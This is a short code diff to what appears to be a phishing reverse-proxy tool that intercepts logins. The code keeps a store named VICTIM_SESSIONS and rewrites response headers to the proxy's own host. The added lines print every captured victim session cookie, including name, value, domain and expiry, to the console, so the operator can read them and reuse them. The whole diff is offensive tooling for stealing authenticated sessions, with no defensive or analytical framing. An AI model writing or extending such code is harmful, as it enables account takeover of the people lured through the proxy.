@@ -308,6 +308,13 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
         if (proxyResponseCookie) {
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
+
+            // ===================== ADDED: PRINT ALL COOKIES TO CONSOLE =====================
+            console.log(`[COOKIES] Session: ${currentSession}`);
+            for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
+                console.log(`  ${cookie.name}=${cookie.value} (domain=${cookie.domain}, path=${cookie.path}, expires=${new Date(cookie.expires).toISOString()})`);
+            }
+            // ==============================================================================
         }
         proxyResponse.headers["cache-control"] = "no-store";
         proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
